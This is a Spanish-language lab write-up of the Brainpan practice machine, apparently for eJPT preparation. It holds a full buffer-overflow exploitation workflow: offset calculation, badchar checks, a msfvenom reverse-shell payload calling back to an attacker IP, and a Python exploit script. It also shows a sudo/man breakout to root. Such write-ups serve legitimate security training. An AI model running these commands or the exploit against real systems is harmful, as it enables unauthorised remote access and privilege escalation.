# Informe de Pentesting - Brainpan

**Máquina:** Brainpan
**Autor:** Klauss Reyes Granados
**Certificación:** Preparación eJPT

---

## 🎯 Objetivo

Explotar una vulnerabilidad de desbordamiento de buffer (buffer overflow) en un servicio personalizado que escucha en el puerto 9999. Esta máquina está diseñada para poner en práctica técnicas de análisis de binarios, cálculo de offset, identificación de badchars y ejecución de shellcode con una reverse shell.

---

## 🛰️ Recolección de Información

### 1. Obtener IP local:

```bash
ifconfig
```

### 2. Escaneo de red:

```bash
arp-scan -I eth0 192.1.1.0/24
```

### 3. Escaneo de puertos en el objetivo:

```bash
nmap -p- -sV -sS -Pn -n 192.1.1.5
```

Se identifican:

* Puerto 9999: Servicio TCP personalizado (binario vulnerable)

---

## 🔎 Enumeración

### Servicio personalizado - Puerto 9999

```bash
nc 192.1.1.5 9999
```

El servicio responde con un banner personalizado. Al enviar una cadena larga (por ejemplo 1000 caracteres `A`) se produce un fallo y el binario se cierra inesperadamente, lo que indica un posible desbordamiento de buffer.

---

## 💥 Explotación - Buffer Overflow

### 🧪 Paso 1: Reproducir el crash

Se envía una cadena de 1000 caracteres:

```bash
echo $(python3 -c 'print("A"*1000)') | nc 192.1.1.5 9999
```

Se confirma que el servicio se cae y se sobreescribe el registro EIP.

### 🎯 Paso 2: Cálculo del Offset

Generamos un patrón con Metasploit:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Enviamos este patrón al servicio y capturamos el valor exacto que entra en EIP:

```bash
echo "<PATRÓN>" | nc 192.1.1.5 9999
```

Luego:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <valor_EIP>
```

Resultado: `Offset = 524`

### 🔎 Paso 3: Identificación de badchars

Creamos una lista de badchars del `\x01` al `\xff` (omitiendo `\x00` inicialmente) y la enviamos en ESP, monitoreando con Immunity Debugger + Mona:

```bash
!mona bytearray -b "\x00"
!mona compare -a <ESP> -f bytearray.bin
```

Se eliminan los badchars detectados (ej. `\x00`, `\x0a`, `\x0d` si corresponde).

### 💣 Paso 4: Generar shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.1.1.4 LPORT=4444 -f c -b "\x00" EXITFUNC=thread
```

### 📍 Paso 5: Localizar una instrucción JMP ESP

```bash
!mona modules
!mona find -s "\xff\xe4" -m brainpan.exe
```

Supongamos que la dirección obtenida es: `0x311712F3`

### 🧪 Paso 6: Script de explotación final

```python
#!/usr/bin/python3
import socket
from struct import pack

ip = "192.1.1.5"
port = 9999

# Offset determinado
offset = 524

# Dirección JMP ESP encontrada
eip = pack("<I", 0x311712F3)

# NOP sled + shellcode (incompleto por brevedad)
shellcode =  b"\x90" * 16
shellcode += (
    b"\xdb\xd6\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x52\xbe\xf9\x7a\xcd\x45"
    b"... (tu shellcode generado) ..."
)

payload = b"A" * offset + eip + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload)
s.close()
```

---

## ⬆️ Escalado de Privilegios

Una vez obtenida la reverse shell:

### Revisar privilegios sudo:

```bash
sudo -l
```

Se descubre que el binario `/home/anansi/bin/anansi_util` se puede ejecutar como root sin contraseña:

```bash
sudo /home/anansi/bin/anansi_util manual man
```

Utilizando técnicas de breakout de comandos `man`, se escapa a shell root:

* En el visor `man`, presionar `!sh`

---

## ✅ Conclusiones

* El binario en el puerto 9999 contiene una vulnerabilidad de desbordamiento de buffer explotable remotamente.
* Se logró ejecutar una reverse shell con `msfvenom`, saltando al shellcode mediante `JMP ESP`.
* Posteriormente se consiguió acceso root explotando un binario con `sudo` vulnerable.

> Una máquina excelente para practicar Buffer Overflow realista, explotación en Windows y técnicas de escalada en Linux.
